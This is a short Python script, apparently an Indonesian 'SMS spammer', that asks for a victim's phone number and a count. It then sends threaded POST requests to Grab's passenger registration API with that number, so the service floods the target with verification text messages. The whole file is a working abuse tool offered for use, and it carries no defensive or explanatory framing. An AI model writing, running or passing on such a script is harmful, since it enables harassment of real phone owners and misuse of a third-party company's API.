#!/usr/bin/python
# Coded by Moreno77
from multiprocessing.pool import ThreadPool
try:
	import os, random
	from time import sleep as turu
	import subprocess as sp
	import requests
except ModuleNotFoundError:
	print("\nSepertinya module requests BELUM Di Install")
	print("$ pip install requests\n")
	exit()

try:
	print("""\033[1;32m
      +---------[ Spamer SMS Grab ]----------+""")
	no = input("\033[1;32m[?] Nomor Korban =>\033[1;33m ")
	jum=int(input("\033[1;32m[?] Jumlah Spam => \033[1;33m"))
except KeyboardInterrupt:
	print("\nKey interrupt")
	exit()
print()
print("[*] Proses...")
def main(arg):
	try:
		idk=('phoneNumber')
		r = requests.post('https://p.grabtaxi.com/api/passenger/v2/profiles/register', data={'phoneNumber':no, 'countryCode': 'ID', 'name': 'nuubi', 'email': 'nuubi@mail.com', 'deviceToken': '*'}, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36'})
#		print(r.text)
		if str(idk) in str(r.text):
			print("\033[1;32m[+] Sukses Mengirim Spam!")
		else:
			print("\033[1;31m[-] Gagal Mengirim Spam!")
	except: pass

jobs = []
for x in range(jum):
    jobs.append(x)
p=ThreadPool(5)
p.map(main,jobs)
print("\033[1;33m[*] Proses Selesai")
